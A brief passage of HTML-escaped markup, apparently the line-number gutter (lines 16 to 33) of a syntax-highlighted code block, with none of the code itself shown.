class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span